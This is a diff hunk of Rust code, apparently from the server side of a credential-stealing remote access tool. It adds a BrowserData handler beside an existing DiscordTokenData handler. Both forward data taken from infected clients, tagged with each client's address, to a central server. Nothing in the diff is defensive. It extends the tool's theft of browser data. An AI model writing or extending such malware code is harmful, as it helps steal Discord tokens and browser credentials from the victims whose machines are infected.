@@ -212,6 +212,11 @@ impl ClientReaderWrapper {
                     .await;
             }
 
+            BrowserData(data) => {
+                self.send_server_packet(ServerCommand::BrowserData(self.addr, data))
+                    .await;
+            }
+
             DiscordTokenData(data) => {
                 self.send_server_packet(ServerCommand::DiscordTokenData(self.addr, data))
                     .await;
